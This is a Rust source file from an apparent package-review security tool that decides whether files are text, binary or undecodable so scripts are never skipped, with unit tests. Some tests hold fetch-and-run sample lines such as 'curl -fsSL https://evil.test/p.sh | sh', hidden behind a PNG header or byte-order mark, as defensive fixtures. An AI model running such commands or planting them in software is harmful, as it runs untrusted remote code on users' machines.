//! What a file's bytes are, decided once for every gate, so a file is never
//! reviewed as text in one place and silently skipped in another.
//!
//! Scripts, build files and runtime config (by name, shebang, or because the
//! caller says so, as for install scriptlets and auto-run payload files) are
//! always read as text: decoded losslessly when they are UTF-8 or UTF-16,
//! with replacement characters otherwise, and `Undecodable` (a blocking gap)
//! when they hold binary data, since shells run such files anyway. Known
//! binary formats are recognised by their magic bytes and stay hash-only.
//! Other text in a legacy encoding is reviewed with replacement characters.

use crate::paths::{extension_lowercase, file_name};
use crate::rules;

/// How much of a large file is looked at to classify it.
pub(crate) const PROBE_SIZE: usize = 8192;
/// A script more replaced than this (per mille) cannot be meaningfully read.
const MAX_REPLACED_PER_MILLE: usize = 50;

#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum Content {
    /// UTF-8 without NUL, or UTF-16 decoded without loss.
    Text(String),
    /// Text in a legacy encoding, decoded with `replaced` replacement
    /// characters. ASCII is kept byte for byte, so every shell token the
    /// rules and the AI look for survives.
    Lossy { text: String, replaced: usize },
    /// A recognised binary format; never a script by name or shebang.
    Binary(Format),
    /// A script, build or config file (or an executable file of unknown
    /// format) holding binary data: it cannot be reviewed.
    Undecodable,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Format {
    Known {
        label: &'static str,
        /// Machine code or bytecode that runs when loaded.
        executable: bool,
    },
    /// Binary data (NUL bytes) with no known magic.
    Unrecognized,
}

impl Format {
    /// The label as Guardian names it, from one given elsewhere (the root
    /// collector's output); an unknown label is reported as unrecognized.
    pub(crate) fn label_named(label: &str) -> &'static str {
        MAGIC
            .iter()
            .map(|(_, _, known, _)| *known)
            .chain(WEAK_MAGIC.iter().map(|(_, _, known, _)| *known))
            .find(|known| *known == label)
            .unwrap_or("unrecognized binary data")
    }

    pub(crate) const fn label(self) -> &'static str {
        match self {
            Self::Known { label, .. } => label,
            Self::Unrecognized => "unrecognized binary data",
        }
    }

    pub(crate) const fn executable(self) -> bool {
        matches!(
            self,
            Self::Known {
                executable: true,
                ..
            }
        )
    }

    /// Images, audio, video and fonts: grouped per directory in the AI
    /// manifest, where one theme can hold hundreds of them.
    pub(crate) fn is_media(self) -> bool {
        match self {
            Self::Known { label, .. } => ["image", "audio", "video", "font"]
                .iter()
                .any(|kind| label.contains(kind)),
            Self::Unrecognized => false,
        }
    }
}

/// A large file judged from its first `PROBE_SIZE` bytes.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Prefix {
    /// Text (or a file that must be read as text): too large to review, so a gap.
    Text,
    Binary(Format),
    Undecodable,
}

/// `(offset, magic, label, executable)`.
const MAGIC: &[(usize, &[u8], &str, bool)] = &[
    (0, b"\x89PNG\r\n\x1a\n", "PNG image", false),
    (0, b"!<arch>\n", "static library", false),
    (0, b"\xff\xd8\xff", "JPEG image", false),
    (0, b"GIF87a", "GIF image", false),
    (0, b"GIF89a", "GIF image", false),
    (0, b"II*\0", "TIFF image", false),
    (0, b"MM\0*", "TIFF image", false),
    (0, b"8BPS", "Photoshop image", false),
    (0, b"gimp xcf", "GIMP image", false),
    (0, b"icns", "macOS icon image", false),
    (0, b"\x1aE\xdf\xa3", "Matroska video", false),
    (0, b"OggS", "Ogg audio", false),
    (0, b"fLaC", "FLAC audio", false),
    (0, b"ID3", "MP3 audio", false),
    (0, b"\0\x01\0\0", "TrueType font", false),
    (0, b"OTTO", "OpenType font", false),
    (0, b"ttcf", "TrueType collection font", false),
    (0, b"wOFF", "WOFF font", false),
    (0, b"wOF2", "WOFF2 font", false),
    (0, b"%PDF-", "PDF document", false),
    (0, b"PK\x03\x04", "ZIP archive", false),
    (0, b"PK\x05\x06", "ZIP archive", false),
    (0, b"\x1f\x8b", "gzip archive", false),
    (0, b"\xfd7zXZ\0", "xz archive", false),
    (0, b"\x28\xb5\x2f\xfd", "zstd archive", false),
    (0, b"BZh", "bzip2 archive", false),
    (0, b"7z\xbc\xaf\x27\x1c", "7-Zip archive", false),
    (0, b"Rar!\x1a\x07", "RAR archive", false),
    (257, b"ustar", "tar archive", false),
    (0, b"SQLite format 3\0", "SQLite database", false),
    (0, b"\xde\x12\x04\x95", "gettext translations", false),
    (0, b"\x95\x04\x12\xde", "gettext translations", false),
    (0, b"\0\0\0\x01Bud1", "macOS folder metadata", false),
    (0, b"BLENDER", "Blender file", false),
    (0, b"DIRC", "git index", false),
    (0, b"PACK", "git pack", false),
    (0, b"\x7fELF", "ELF executable", true),
    (0, b"\0asm", "WebAssembly module", true),
    (0, b"\xfe\xed\xfa\xce", "Mach-O executable", true),
    (0, b"\xfe\xed\xfa\xcf", "Mach-O executable", true),
    (0, b"\xcf\xfa\xed\xfe", "Mach-O executable", true),
    (0, b"\xca\xfe\xba\xbe", "Mach-O or Java class", true),
];

/// Magic bytes too short to trust alone: they also need the extension.
const WEAK_MAGIC: &[(&[u8], &[&str], &str, bool)] = &[
    (b"BM", &["bmp"], "BMP image", false),
    (b"\0\0\x01\0", &["ico"], "icon image", false),
    (b"\0\0\x02\0", &["cur"], "cursor image", false),
    (
        b"MZ",
        &["exe", "dll", "efi", "sys"],
        "Windows executable",
        true,
    ),
];

/// Extensions of compiled formats without reliable magic.
const BINARY_EXTENSIONS: &[(&str, &str, bool)] = &[
    ("pyc", "Python bytecode", true),
    ("pyo", "Python bytecode", true),
];

/// Names that are always read as code on top of
/// `rules::is_executable_or_runtime_config`.
const REVIEW_NAMES: &[&str] = &[
    "pkgbuild",
    ".install",
    "configure",
    "makefile",
    "gnumakefile",
    "justfile",
    "meson.build",
    "cmakelists.txt",
    "build.rs",
    "setup.py",
];
const REVIEW_EXTENSIONS: &[&str] = &[
    "install", "hook", "rules", "timer", "socket", "path", "service", "mk", "patch", "diff",
    "sudoers", "pam", "cron",
];

/// Whether `rel` must be read as code whatever its bytes are: a shebang, or
/// a script, build or runtime-config name.
pub(crate) fn must_review(rel: &str, head: &[u8]) -> bool {
    if head.starts_with(b"#!") {
        return true;
    }
    let name = file_name(rel).to_ascii_lowercase();
    let extension = name
        .rsplit_once('.')
        .map(|(_, extension)| extension)
        .unwrap_or_default();
    REVIEW_NAMES.contains(&name.as_str())
        || REVIEW_EXTENSIONS.contains(&extension)
        || rules::is_executable_or_runtime_config(rel)
}

/// Classifies a whole file. `force` marks a file that must be read as code
/// (an install scriptlet, an auto-run payload file); `executable` is the
/// file's execute bit.
pub(crate) fn classify(rel: &str, executable: bool, force: bool, bytes: &[u8]) -> Content {
    let review = force || must_review(rel, bytes);
    if let Ok(text) = std::str::from_utf8(bytes)
        && !text.contains('\0')
    {
        return Content::Text(text.to_string());
    }
    // UTF-16 only where it reads as text: a shell takes a script by its
    // bytes whatever mark it starts with, so one that would decode to
    // something else than what runs is read by its bytes too.
    if let Some(text) = utf16(bytes)
        && !text.contains('\0')
        && is_mostly_ascii(&text)
    {
        return Content::Text(text);
    }
    if review {
        return decoded_script(bytes);
    }
    // A known format by its first bytes, unless the rest is plain text
    // (`ID3=1` at the top of a script is no MP3).
    if let Some(format) = magic(rel, bytes)
        && !reads_as_text(bytes)
    {
        return Content::Binary(format);
    }
    // Text with a few NUL bytes in it is still what a shell or an
    // interpreter reads (they skip them): not a binary to pass over.
    if bytes.contains(&0) && starts_as_text(bytes) {
        return Content::Undecodable;
    }
    if !bytes.contains(&0) {
        let text = String::from_utf8_lossy(bytes).into_owned();
        let replaced = text
            .chars()
            .filter(|character| *character == '\u{fffd}')
            .count();
        return Content::Lossy { text, replaced };
    }
    if executable {
        Content::Undecodable
    } else {
        Content::Binary(Format::Unrecognized)
    }
}

/// Classifies a payload file that must be read as code, except that a
/// recognised executable format (an ELF generator, a compiled program a
/// hook runs) is reported as that binary, for the caller to allow or refuse.
pub(crate) fn classify_payload(rel: &str, bytes: &[u8]) -> Content {
    match classify(rel, false, true, bytes) {
        Content::Undecodable => match magic(rel, bytes) {
            Some(format) if format.executable() => Content::Binary(format),
            _ => Content::Undecodable,
        },
        other => other,
    }
}

/// Classifies a file too large to review from its first bytes.
pub(crate) fn classify_prefix(rel: &str, executable: bool, head: &[u8]) -> Prefix {
    let probe = &head[..head.len().min(PROBE_SIZE)];
    if must_review(rel, probe) {
        return Prefix::Text;
    }
    if let Some(format) = magic(rel, probe)
        && !reads_as_text(probe)
    {
        return Prefix::Binary(format);
    }
    if !probe.contains(&0) || utf16(trim_to_even(probe)).is_some() || starts_as_text(probe) {
        return Prefix::Text;
    }
    if executable {
        Prefix::Undecodable
    } else {
        Prefix::Binary(Format::Unrecognized)
    }
}

/// Whether nearly all of `text` is ASCII, as UTF-16 text of the kinds
/// reviewed here is (scripts, registry files); a file of bytes that only
/// happens to decode as UTF-16 is not.
fn is_mostly_ascii(text: &str) -> bool {
    let total = text.chars().count().max(1);
    let ascii = text.chars().filter(char::is_ascii).count();
    ascii * 10 >= total * 9
}

/// Whether the first bytes are overwhelmingly printable text (with a NUL
/// here and there at most).
fn is_text_like(bytes: &[u8]) -> bool {
    let probe = &bytes[..bytes.len().min(PROBE_SIZE)];
    if probe.len() < 8 {
        return false;
    }
    // By characters, so text in any script counts and a run of bytes that
    // is no UTF-8 does not.
    let text = String::from_utf8_lossy(probe);
    let (mut all, mut printable) = (0usize, 0usize);
    for character in text.chars() {
        all += 1;
        if matches!(character, '\n' | '\r' | '\t')
            || !(character.is_control() || character == '\u{fffd}')
        {
            printable += 1;
        }
    }
    printable * 100 >= all * 95
}

/// Whether bytes that start like a known format are text all the same:
/// lines with no NUL among them (which such a format has early on) and
/// hardly a character that is not printable.
fn reads_as_text(bytes: &[u8]) -> bool {
    let probe = &bytes[..bytes.len().min(PROBE_SIZE)];
    if probe.contains(&0) || !probe.contains(&b'\n') {
        return false;
    }
    let text = String::from_utf8_lossy(probe);
    let (mut all, mut odd) = (0usize, 0usize);
    for character in text.chars() {
        all += 1;
        if !matches!(character, '\n' | '\r' | '\t')
            && (character.is_control() || character == '\u{fffd}')
        {
            odd += 1;
        }
    }
    odd <= 8 + all / 50
}

/// Whether bytes with a NUL among them still open as a shell takes a
/// script: a first line of plain text (a shell refuses a file with a NUL
/// there, and drops the ones further on) and text after it.
fn starts_as_text(bytes: &[u8]) -> bool {
    let first = &bytes[..bytes.len().min(80)];
    let first = &first[..first
        .iter()
        .position(|byte| *byte == b'\n')
        .unwrap_or(first.len())];
    first
        .iter()
        .all(|byte| matches!(byte, b'\t' | b'\r' | 0x20..=0x7e))
        && is_text_like(bytes)
}

fn trim_to_even(bytes: &[u8]) -> &[u8] {
    &bytes[..bytes.len() & !1]
}

/// A script's text: lossy UTF-8, or `Undecodable` when binary data is left
/// or too much of it could not be decoded.
fn decoded_script(bytes: &[u8]) -> Content {
    if bytes.contains(&0) {
        return Content::Undecodable;
    }
    let text = String::from_utf8_lossy(bytes).into_owned();
    let replaced = text
        .chars()
        .filter(|character| *character == '\u{fffd}')
        .count();
    let total = text.chars().count().max(1);
    if replaced * 1000 > total * MAX_REPLACED_PER_MILLE {
        return Content::Undecodable;
    }
    Content::Lossy { text, replaced }
}

/// UTF-16 with a byte-order mark, or little-endian without one when every
/// high byte of the first characters is zero and the low bytes are
/// printable (Windows `.reg`, `.ps1`, `.bat`).
fn utf16(bytes: &[u8]) -> Option<String> {
    let (little, body) = match bytes {
        [0xff, 0xfe, rest @ ..] => (true, rest),
        [0xfe, 0xff, rest @ ..] => (false, rest),
        _ => {
            let probe = &bytes[..bytes.len().min(512)];
            let looks_le = bytes.len() >= 4
                && bytes.len().is_multiple_of(2)
                && probe.as_chunks::<2>().0.iter().all(|pair| {
                    pair[1] == 0
                        && (pair[0] == b'\n'
                            || pair[0] == b'\r'
                            || pair[0] == b'\t'
                            || (0x20..0x7f).contains(&pair[0]))
                });
            if !looks_le {
                return None;
            }
            (true, bytes)
        }
    };
    if !body.len().is_multiple_of(2) {
        return None;
    }
    let units = body.as_chunks::<2>().0.iter().map(|pair| {
        if little {
            u16::from_le_bytes([pair[0], pair[1]])
        } else {
            u16::from_be_bytes([pair[0], pair[1]])
        }
    });
    Some(
        char::decode_utf16(units)
            .map(|unit| unit.unwrap_or('\u{fffd}'))
            .collect(),
    )
}

/// The binary format `bytes` start with, if known.
fn magic(rel: &str, bytes: &[u8]) -> Option<Format> {
    let extension = extension_lowercase(rel);
    let known = |label: &'static str, executable: bool| Format::Known { label, executable };
    for (offset, magic, label, executable) in MAGIC {
        if bytes.get(*offset..offset + magic.len()) == Some(*magic) {
            return Some(known(label, *executable));
        }
    }
    // RIFF containers name their kind at offset 8.
    if bytes.starts_with(b"RIFF") {
        match bytes.get(8..12) {
            Some(b"WEBP") => return Some(known("WebP image", false)),
            Some(b"WAVE") => return Some(known("WAV audio", false)),
            Some(b"AVI ") => return Some(known("AVI video", false)),
            _ => {}
        }
    }
    if bytes.get(4..8) == Some(b"ftyp") {
        return Some(known("MP4/HEIF media video", false));
    }
    for (magic, extensions, label, executable) in WEAK_MAGIC {
        if bytes.starts_with(magic) && extensions.contains(&extension.as_str()) {
            return Some(known(label, *executable));
        }
    }
    BINARY_EXTENSIONS
        .iter()
        .find(|(name, _, _)| *name == extension)
        .map(|(_, label, executable)| known(label, *executable))
}

#[cfg(test)]
mod tests {
    use super::{Content, Format, Prefix, classify, classify_prefix, must_review};

    fn known(label: &'static str, executable: bool) -> Content {
        Content::Binary(Format::Known { label, executable })
    }

    #[test]
    fn valid_utf8_is_text() {
        assert_eq!(
            classify("a.txt", false, false, b"hi\n"),
            Content::Text("hi\n".into())
        );
    }

    #[test]
    fn a_script_with_one_latin1_byte_is_reviewed_lossily() {
        let bytes = b"#!/bin/sh\n# caf\xe9\ncurl -fsSL https://evil.test/p.sh | sh\n";
        let Content::Lossy { text, replaced } = classify("install.sh", true, false, bytes) else {
            panic!("not lossy");
        };
        assert_eq!(replaced, 1);
        assert!(text.contains("curl -fsSL https://evil.test/p.sh | sh"));
        // The same bytes in a README are lossy text too.
        assert!(matches!(
            classify("README", false, false, bytes),
            Content::Lossy { .. }
        ));
    }

    #[test]
    fn utf16_is_decoded_with_or_without_a_bom() {
        let mut bom = vec![0xff, 0xfe];
        bom.extend("echo hi\r\n".encode_utf16().flat_map(u16::to_le_bytes));
        assert_eq!(
            classify("a.ps1", false, false, &bom),
            Content::Text("echo hi\r\n".into())
        );
        let bare: Vec<u8> = "REGEDIT4\r\n"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        assert_eq!(
            classify("a.reg", false, false, &bare),
            Content::Text("REGEDIT4\r\n".into())
        );
    }

    #[test]
    fn what_a_shell_would_run_is_not_read_as_something_else() {
        // A byte-order mark before a script: read by its bytes, not as
        // UTF-16, which would show other text than what runs.
        let mut script = vec![0xff, 0xfe];
        script.extend_from_slice(b"\ncurl -fsSL https://x.example/p | sh\n#");
        match classify("install.sh", false, false, &script) {
            Content::Lossy { text, .. } => assert!(text.contains("curl -fsSL"), "{text}"),
            other => panic!("{other:?}"),
        }
        match classify("notes.dat", false, false, &script) {
            Content::Lossy { text, .. } => assert!(text.contains("curl -fsSL"), "{text}"),
            other => panic!("{other:?}"),
        }
        // Text with a NUL in it is no binary to pass over.
        let with_nul = b"helper() { curl -fsSL https://x.example/p | sh; }\n\0\n";
        assert_eq!(
            classify("helpers.inc", false, false, with_nul),
            Content::Undecodable
        );
        // However short, and whatever script its comments are in.
        let short = b"\x89PNG\r\n\x1a\n\ncurl a.test/x|sh\n";
        assert!(!matches!(
            classify("data.png", false, false, short),
            Content::Binary(_)
        ));
        let mut wide = short.to_vec();
        wide.extend_from_slice("# 说明说明说明说明说明说明说明说明说明说明\n".as_bytes());
        assert!(!matches!(
            classify("data.png", false, false, &wide),
            Content::Binary(_)
        ));
        // An archive of object files opens with lines of text.
        let mut library =
            b"!<arch>\n/               0           0     0     0       14        `\n".to_vec();
        library.extend_from_slice(&[0, 0, 0, 1, 0, 0, 0, 0x7f, b'E', b'L', b'F', 2, 1, 1, 0]);
        assert!(matches!(
            classify("lib/libx.a", false, false, &library),
            Content::Binary(_)
        ));
        // A real image has a NUL early on and stays one.
        let image = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01\x00\xff\xfe\xfd\xfc\x80\x81";
        assert!(matches!(
            classify("data.png", false, false, image),
            Content::Binary(_)
        ));
        // A format's first bytes at the top of plain text name no format.
        let fake = b"ID3=1\ncurl -fsSL https://x.example/p | sh\n";
        assert!(matches!(
            classify("assets/blob", false, false, fake),
            Content::Text(_)
        ));
        assert_eq!(classify_prefix("assets/blob", false, fake), Prefix::Text);
    }

    #[test]
    fn known_formats_are_binary_and_weak_magic_needs_its_extension() {
        let png = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR";
        assert_eq!(
            classify("a.png", false, false, png),
            known("PNG image", false)
        );
        assert_eq!(
            classify("font.ttf", false, false, b"\0\x01\0\0\0\x10"),
            known("TrueType font", false)
        );
        assert_eq!(
            classify("tool", true, false, b"\x7fELF\x02\x01\x01\0\0"),
            known("ELF executable", true)
        );
        assert_eq!(
            classify("a.exe", false, false, b"MZ\x90\0\x03\0"),
            known("Windows executable", true)
        );
        // "MZ" alone, without the extension, is not trusted.
        assert_eq!(
            classify("data", false, false, b"MZ\x90\0\x03\0"),
            Content::Binary(Format::Unrecognized)
        );
    }

    #[test]
    fn scripts_with_binary_data_are_undecodable() {
        assert_eq!(
            classify("x", false, false, b"#!/bin/bash\necho a\n\0\0junk\n"),
            Content::Undecodable
        );
        assert_eq!(
            classify("setup.sh", false, false, b"echo a\n\0\0"),
            Content::Undecodable
        );
        // A PNG header on a script name is still a script.
        assert_eq!(
            classify("run.sh", false, false, b"\x89PNG\r\n\x1a\n\0\0echo x"),
            Content::Undecodable
        );
        // Forced files (install scriptlets, auto-run payload) likewise.
        assert_eq!(
            classify("etc/sudoers.d/x", false, true, b"ALL\0ALL"),
            Content::Undecodable
        );
    }

    #[test]
    fn an_executable_unknown_blob_is_undecodable_and_a_plain_one_is_binary() {
        assert_eq!(
            classify("blob", true, false, b"\x01\x02\0\x03"),
            Content::Undecodable
        );
        assert_eq!(
            classify("blob", false, false, b"\x01\x02\0\x03"),
            Content::Binary(Format::Unrecognized)
        );
    }

    #[test]
    fn a_mostly_undecodable_script_is_undecodable() {
        let bytes: Vec<u8> = b"#!/bin/sh\n"
            .iter()
            .copied()
            .chain((0..100).map(|_| 0xff))
            .collect();
        assert_eq!(classify("x.sh", false, false, &bytes), Content::Undecodable);
    }

    #[test]
    fn large_files_are_judged_from_their_prefix() {
        assert_eq!(classify_prefix("big.sh", false, b"echo \xe9"), Prefix::Text);
        assert_eq!(
            classify_prefix("big.txt", false, b"plain \xe9 text"),
            Prefix::Text
        );
        assert_eq!(
            classify_prefix("a.png", false, b"\x89PNG\r\n\x1a\n\0\0"),
            Prefix::Binary(Format::Known {
                label: "PNG image",
                executable: false
            })
        );
        assert_eq!(
            classify_prefix("blob", true, b"\x01\0\x02"),
            Prefix::Undecodable
        );
        assert!(must_review("pkg/PKGBUILD", b""));
        assert!(must_review("x", b"#!/usr/bin/env python3"));
        assert!(!must_review("wallpaper.png", b"\x89PNG"));
    }
}
